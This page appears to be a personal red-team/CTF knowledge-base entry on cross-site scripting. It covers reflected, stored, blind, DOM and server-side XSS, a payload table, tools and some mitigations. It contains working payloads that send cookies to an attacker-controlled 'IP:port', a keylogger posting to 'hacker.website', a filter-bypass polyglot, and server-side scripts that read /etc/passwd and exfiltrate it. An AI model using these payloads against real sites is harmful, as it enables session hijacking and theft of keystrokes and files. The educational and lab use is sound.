# Cross-site Scripting (XSS)

[![xss_filter_evasion](../../../../_badges/owasp/xss_filter_evasion.svg)](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
[![dom_based_xss_prevention](../../../../_badges/owasp/dom_based_xss_prevention.svg)](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
[![introductiontowebapplications](../../../../_badges/htb/introductiontowebapplications.svg)](https://academy.hackthebox.com/course/preview/introduction-to-web-applications)
[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![xss_injection](../../../../_badges/poat/xss_injection.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![howwebsiteswork](../../../../_badges/thmp/howwebsiteswork.svg)](https://tryhackme.com/room/howwebsiteswork)
[![adventofcyber2](../../../../_badges/thm/adventofcyber2/day6.svg)](https://tryhackme.com/room/adventofcyber2)
[![marketplace](../../../../_badges/thm-p/marketplace.svg)](https://tryhackme.com/r/room/marketplace)
[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
[![xss_reflected](../../../../_badges/rootme/web_client/xss_reflected.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)
[![xss_dom_based_introduction](../../../../_badges/rootme/web_client/xss_dom_based_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
[![xss_dom_based_filters_bypass](../../../../_badges/rootme/web_client/xss_dom_based_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)
[![xss_stored_filter_bypass](../../../../_badges/rootme/web_client/xss_stored_filter_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)
[![xss_dom_based](../../../../_badges/rootme/web_client/xss_dom_based.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based)

<div class="row row-cols-lg-2"><div>

Cross-site Scripting, most commonly called XSS, refers to injecting malicious JavaScript in a web application for it to be executed by other users. For instance, instead of a username, you could use:

```xml!
<script>alert('XSS')</script>
```

And, if the website isn't protected, then anyone consulting your profile will run the script `alert('XSS')` and will see an alert.

‚ö†Ô∏è When using XSS, you want to hide that you executed some XSS in someone's browser. So, you should ensure that no one sees anything suspicious. For instance, add a valid value before the XSS payload.

üí° XSS may be called HTML Injection when using an HTML payload.
</div><div>

Common attack vectors

* üìö Headers <small>(mostly User-Agent)</small>
* üìÑ Forms <small>(Logic flaw: not protecting dropdowns)</small>
* üç™ Cookies

Common mitigations to XSS attacks are:

* üõë [Content-Security-Policy (CSP) header](/operating-systems/networking/protocols/http.md#http-headers-in-web-applications) + secure cookies
* üõ°Ô∏è Input sanitization <small>(`htmlentities`/`addslashes` in PHP)</small>
* üîé Input filtering <small>(`strip_tags` in PHP)</small>
* üî• Web Application Firewall <small>(WAF)</small>
</div></div>

<hr class="sep-both">

## XSS Attacks

[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)

<div class="row row-cols-lg-2"><div>

#### Reflected XSS

[![xss_reflected](../../../../_badges/rootme/web_client/xss_reflected.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)

XSS is reflected when the injected payload is shown on the vulnerable webpage after being rendered by the web server.

üó∫Ô∏è The payload is usually inside the URL. For instance, given the URL: `https://example.com/vuln.php?q=payload` that render `payload` when loaded. We could exploit it using:

```xml!
https://example.com/vuln.php/?q=%3Cscript%3Ealert(%27XSS%27)%3B%3C%2Fscript%3E
```

üç∑ Users clicking on the link will execute our payload.

<br>

#### Stored XSS

[![marketplace](../../../../_badges/thm-p/marketplace.svg)](https://tryhackme.com/r/room/marketplace)
[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)
[![xss_stored_filter_bypass](../../../../_badges/rootme/web_client/xss_stored_filter_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)

The payload is injected and stored on the server, mostly in a database. At some point, it may be executed by a vulnerable web page.

üó∫Ô∏è Comments, profiles, listings... may be vulnerable.

üç∑ For instance, assuming we use the username `<script>alert('XSS');</script>`, if the profile page is vulnerable, this code will be executed when the server renders our username.
</div><div>

#### Blind XSS

XSS is said to be blind or out-band when we are sending a payload without prior knowledge of where it will be executed.

üó∫Ô∏è Feedback, contact, or support forms. We are targeting the administrators by testing if a contact chanel is vulnerable to any XSS.

üç∑ For instance, we include images in each parameter such as `<img src="IP:PORT/username">` for `username`. If we receive a request to `/xxx` on our grabber, then the payload worked for parameter `xxx`. Otherwise, we try another payload.

Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch the response during CTFs.

<br>

#### DOM-based XSS

[![introductiontowebapplications](../../../../_badges/htb/introductiontowebapplications.svg)](https://academy.hackthebox.com/course/preview/introduction-to-web-applications)
[![xss_dom_based_introduction](../../../../_badges/rootme/web_client/xss_dom_based_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
[![xss_dom_based_filters_bypass](../../../../_badges/rootme/web_client/xss_dom_based_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
[![xss_dom_based](../../../../_badges/rootme/web_client/xss_dom_based.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based)

DOM-based XSS occur without the server being aware of them. The client-side JavaScript is the one rendering the payload. For instance, when we use `xxx.innerHTML` or `document.write` <small>(referred to as "a sinker")</small>.

üó∫Ô∏è Mostly, javascript-based applications.

üç∑ If an application parsing anchors `URL#xxx` and displays a message, it may be exploited with payloads like `<img src="" onerror=print()>`. Most functions don't allow the `script` tag.
</div></div>


<hr class="sep-both">

## XSS payloads

[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)

<table class="table table-bordered border-dark table-dark bg-transparent mt-4">
<thead>
<tr><th>Case</th><th>HTML</th><th>Payload</th></tr>
</thead>
<tbody>

<tr><td>PoC</td><td><code>&lt;p&gt;here&lt;/p&gt;</code></td><td>

`<script>alert('XSS')</script>`<br>
`<script>print()</script>`<br>
`<plaintext>`<br>
`<script>fetch('TARGET/fetch1');</script>`<br>
`<script>new Image().src = "TARGET/script_img";</script>`<br>
`<script>document.location="TARGET/location";</script>`
</td></tr>

<tr><td>Boxed attribute</td><td>

`<input value="here">`<br>
`<img src="here" alt="xxx"/>`
</td><td>

`">ReferToPOC` for ANY<br>
`TARGET/img" onload="maliciousCodeHere` for IMG<br>
`" onerror="document.location='TARGET/locationIMG'` for IMG<br>
`" onerror="document.getElementById('autosubmit').submit()` for IMG<br>
`" autofocus onfocus="alert(1)` for INPUT, SELECT, BUTTON, KEYGEN, etc.<br>
`" autofocus onfocus=alert(1);alert(2) x="`
</td></tr>

<tr><td>Unboxed attribute</td><td><code>&lt;input value=here&gt;</code></td><td>Refer to Boxed attribute without the quote.</td></tr>

<tr><td>Wrapped</td><td><code>&lt;textarea>here&lt;/textarea&gt;</code></td><td><code>&lt;/textarea&gt;ReferToPOC</code></td></tr>

<tr><td>JavaScript</td><td><code>xxx.innerHTML = 'here';</code></td><td><code>';MaliciousCodeHere;//</code></td></tr>
</tbody></table>

<hr class="sep-both">

## XSS 'malicious code'

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)

<div class="row row-cols-lg-2"><div>

Common "malicious code" used in PoC payloads are 

* `alert(...)`: show an alert with a message
* `console.log(...)`: print a message in the console

Real examples of malicious code can be found at [XSS-payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all).

#### Session hijacking/Cookie Stealing

[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![session_security](../../../../_badges/htb/session_security.svg)](https://academy.hackthebox.com/course/preview/session-security)
[![marketplace](../../../../_badges/thm-p/marketplace.svg)](https://tryhackme.com/r/room/marketplace)
[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
[![xss_dom_based_introduction](../../../../_badges/rootme/web_client/xss_dom_based_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
[![xss_dom_based_filters_bypass](../../../../_badges/rootme/web_client/xss_dom_based_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
[![csp_bypass_nonce](../../../../_badges/rootme/web_client/csp_bypass_nonce.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce)
[![xss_reflected](../../../../_badges/rootme/web_client/xss_reflected.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)
[![xss_stored_filter_bypass](../../../../_badges/rootme/web_client/xss_stored_filter_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)
[![xss_dom_based](../../../../_badges/rootme/web_client/xss_dom_based.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based)

Anyone executing this script will send their cookie to a malicious website owned by the hacker used to capture cookies. The script is using `btoa()` to encode in base64 the values. Sessions cookies are gold üí∞, because with them, we can bypass verifications such as 2FA and access someone else account of insecure webservers.

```html!
<script>fetch('http://IP:port/?cookie=' + btoa(document.cookie));</script>
<script>fetch('http://IP:port', { method: 'POST', mode: 'no-cors', credentials: 'include', body: btoa(document.cookie) });</script>
<script>new Image().src = "http://IP:port/?cookie="+btoa(document.cookie);</script>
<script>let imageElement = document.createElement("img"); imageElement.src = "http://IP:port/?cookie="+btoa(document.cookie); document.body.appendChild(imageElement)</script>
<script>document.location="http://IP:port/?cookie="+document.cookie;</script>
```

Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch the response during CTFs.

üìö Refer to [CSRF](csrf.md) for attacks using a form.
</div><div>

#### Fingerprint

[![session_security](../../../../_badges/htb/session_security.svg)](https://academy.hackthebox.com/course/preview/session-security)

We sometimes need to check a few things:

* `document.domain`: current domain name
* `window.location`: current URL
* `window.origin`: when inside a IFRAME

#### Keylogger

Sends keys pressed to the hacker website. The script is using `btoa()` to encode in base64 the values.

```html!
<script>
    let keys = ''
    document.onkeydown = e => keys += e.key
    setInterval(() => {
        if (keys === '') return
        fetch('https://hacker.website/keylogger?key=' + btoa(keys) )
        keys = ''
    }, 1000)
</script>
```

#### Other Attacks

* Defacing websites
* Injecting a login form to access the original website
</div></div>

<hr class="sep-both">

## XSS bypasses

<div class="row row-cols-lg-2"><div>

#### XSS Filtering Bypass

This section was moved to [HTML Payloads](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#html) and [JavaScript payloads](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#javascript).

<br>

#### XSS Polygots Filtering Bypass

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)

Polygot are complex payloads designed to bypass many filter:

```js!
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```
</div><div>

#### XSS Relative Path Override (RPO)

[![xss_reflected](../../../../_badges/rootme/web_client/xss_reflected.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)

Usually, a URL such as `http://example.com/a/../toto` is processed and replaced with `http://example.com/toto` before it is used.

We can use a mix of URL encoding and not encoded characters to create a URL that is not shortened but still point to a relative folder.

```diff
-https://example.com/../toto/index.php
+https://example.com/..%2Ftoto/index.php
```

This can be used to trick checks like "URL starts with".
</div></div>

<hr class="sep-both">

## XSS Tools ‚öíÔ∏è

<div class="row row-cols-lg-2"><div>

#### XSStrike

[XSStrike](https://github.com/s0md3v/XSStrike) <small>(13.3k ‚≠ê, 2022 ‚ò†Ô∏è)</small> is a popular XSS tool that is still working as of 2024 while it's not maintained.

```shell!
$ cd /opt
$ sudo git clone https://github.com/s0md3v/XSStrike.git
$ sudo chmod +x XSStrike/xsstrike.py
$ sudo ln -s /opt/XSStrike/xsstrike.py /usr/local/bin/xsstrike
$ xsstrike -u 'URL?param=vuln'
```

The tool will process the URL and the parameter to see if any are vulnerable. Press 'Enter' until you find one that works. Carefully read the payload when testing, e.g. 'mouse over,' or stuff like that.
</div><div>

#### Other tools

There are a lot of them, but they are all abandoned. If seems using web scanners such as Burp, Zaproxy, or Nessus is more common.

* [xsser](https://github.com/epsylon/xsser) <small>(1.2k ‚≠ê, 2022 ü™¶Ô∏è)</small>
* [xsscrapy](https://github.com/DanMcInerney/xsscrapy) <small>(1.6k ‚≠ê, 2022 ü™¶Ô∏è)</small>
* [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) <small>(0.5k ‚≠ê, 2021 ü™¶)</small>
* [xsshunter](https://github.com/mandatoryprogrammer/xsshunter) <small>(1.5k ‚≠ê, 2019 ü™¶)</small> + [xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express) <small>(1.6k ‚≠ê, 2021 ü™¶)</small>
* [Zeus-Scanner](https://github.com/Ekultek/Zeus-Scanner) <small>(1.0k ‚≠ê, 2019 ü™¶)</small>
* [whitewidow](https://github.com/WhitewidowScanner/whitewidow) <small>(1.0k ‚≠ê, 2018 ü™¶)</small>
</div></div>

<hr class="sep-both">

## Server-Side XSS

[![server_side_xss_dynamic_pdf](../../../../_badges/hacktricks/pentesting_web/xss_cross_site_scripting/server_side_xss_dynamic_pdf.svg)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)
[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)
[![md2pdf](../../../../_badges/thm-p/md2pdf.svg)](https://tryhackme.com/r/room/md2pdf)
[![surfer](../../../../_badges/thm-p/surfer.svg)](https://tryhackme.com/r/room/surfer)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)

<div class="row row-cols-lg-2"><div>

If a website is creating a PDF using user-input, such as using [wkhtmltopdf](https://wkhtmltopdf.org/downloads.html), we may be able to execute JavaScript code.

```html!
<script>document.write('poc')</script>
<img src="http://IP:port/img"/>
<iframe src="http://IP:port/iframe"></iframe>
<object data="http://IP:port/object">
<embed src="http://IP:port/embed" width="500" height="500">
<meta http-equiv="refresh" content="0;url=http://IP:port/meta" />
```

You can learn more about your environment using:

```html!
<script>document.write(window.location)</script>
<script>document.write(typeof fetch)</script> // undefined
<script>document.write(typeof XMLHttpRequest)</script> // object
```

üìö Tools such as `exiftool` may expose the tool that created the PDF.
</div><div>

Technically, request to another server are categorized as [SSRF](ssrf.md) attacks. Some tools/configuration may prevent us from using `file://` or external URLs. Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch responses.

* We can use it to read files such as `/etc/passwd`:

```html!
<script>xhzeem=new XMLHttpRequest();xhzeem.onload=function(){document.write(this.responseText)};xhzeem.onerror=function(){document.write('failed!')};xhzeem.open("GET","file:///etc/passwd");xhzeem.send();</script>
```

* For Blind Server-Side XSS, we can use:

```html!
<script>xhzeem=new XMLHttpRequest();xhzeem.onload=function(){xhzxfil=new XMLHttpRequest();xhzxfil.open("GET",'http://IP:port/?data='+btoa(this.response),true);xhzxfil.send()};xhzeem.open("GET","file:///etc/passwd",true);xhzeem.send();</script> ;
```
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

Remediation:

```diff
-echo $variable;
-echo htmlspecialchars($variable);
+echo htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
```
</div><div>
</div></div>